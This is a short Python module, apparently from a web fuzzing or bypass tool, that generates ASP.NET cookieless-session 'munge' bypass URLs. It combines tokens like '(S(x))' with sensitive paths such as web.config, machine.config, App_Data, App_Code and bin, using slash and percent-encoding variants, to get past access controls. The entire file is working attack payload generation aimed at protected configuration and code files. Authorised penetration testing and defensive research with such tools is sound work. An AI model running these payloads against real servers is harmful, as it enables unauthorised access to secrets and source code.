"""Known ASP.NET cookieless-munge access-control bypass shapes (DuoDrop-style).

These combine a session-munge token with sensitive locations (App_Data,
App_Code, web.config, bin/...) at several insertion points, independent of
the target path being fuzzed.
"""

STATIC_PATTERNS = [
    "(S(x))",
    "(A(XXXX)F(YYYY))",
    "(D(12345))",
    "(X(ABCDE))",
    "(V(1.0))",
    "(L(SESSION))",
]

SENSITIVE_SUFFIXES = [
    "web.config",
    "machine.config",
    "App_Data",
    "App_Code",
    "App_GlobalResources",
    "App_LocalResources",
    "App_WebReferences",
    "App_Browsers",
    "protected",
    "secure",
    "private",
    "bin",
]


def build_static_payloads(base_url: str, original_path: str) -> set[str]:
    out: set[str] = set()
    op = original_path.strip("/")

    for pattern in STATIC_PATTERNS:
        out.add(f"{base_url}/{pattern}/{op}")
        out.add(f"{base_url}/{op}/{pattern}/")
        out.add(f"{base_url}//{pattern}//{op}")
        out.add(f"{base_url}/%2f{pattern}%2f{op}")

        for suffix in SENSITIVE_SUFFIXES:
            out.add(f"{base_url}/{pattern}/{suffix}/{op}")
            out.add(f"{base_url}/{suffix}/{pattern}/{op}")
            out.add(f"{base_url}/{pattern}/{suffix}")

    return out
